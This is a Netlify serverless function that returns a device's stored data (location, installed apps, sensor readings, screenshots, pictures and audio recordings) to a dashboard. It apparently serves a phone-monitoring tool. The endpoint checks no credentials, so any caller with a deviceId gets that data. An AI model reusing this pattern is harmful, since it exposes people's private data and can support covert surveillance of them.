// netlify/functions/get-status.js

const { getStore } = require("@netlify/blobs");

const NETLIFY_SITE_ID = process.env.NETLIFY_SITE_ID;
const NETLIFY_ACCESS_TOKEN = process.env.NETLIFY_ACCESS_TOKEN;

// The complete list of all data types the dashboard can display
const ALL_DATA_TYPES = [
    "battery_status", "screen_status", "location", "current_app", "installed_apps",
    "accelerometer", "gyroscope", "magnetometer", "gravity", "rotation_vector",
    "game_rotation_vector", "geomagnetic_rotation_vector", "proximity", "light",
    "pressure", "screenshot", "picture", "last_recording"
];

exports.handler = async function(event) {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { deviceId, type: requestedType } = event.queryStringParameters;
    
    if (!deviceId) {
      return { statusCode: 400, body: JSON.stringify({ error: 'Missing deviceId parameter.' }) };
    }

    const store = getStore({
        name: "device-feedback", 
        siteID: NETLIFY_SITE_ID,
        token: NETLIFY_ACCESS_TOKEN
    });
    
    const dataTypesToFetch = requestedType ? [requestedType] : ALL_DATA_TYPES;
    const allDeviceData = {};

    const promises = dataTypesToFetch.map(async (dataType) => {
        const key = `${deviceId}_${dataType}`;
        try {
            // Get the raw data. The {type: 'json'} flag correctly parses objects and strings.
            const data = await store.get(key, { type: 'json' });
            if (data !== null && data !== undefined) {
                allDeviceData[dataType] = data;
            }
        } catch (error) {
            // A 404 "Not Found" error is normal if data hasn't been sent yet. Ignore it.
            if (error.status !== 404) {
                 console.warn(`Could not fetch key '${key}'. Error: ${error.message}`);
            }
        }
    });

    await Promise.all(promises);

    if (Object.keys(allDeviceData).length === 0) {
        return { statusCode: 404, body: JSON.stringify({ error: 'No data found for this device.' })};
    }

    return {
      statusCode: 200,
      body: JSON.stringify(allDeviceData)
    };

  } catch (error) {
    console.error("Get Status Error:", error);
    return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
  }
};
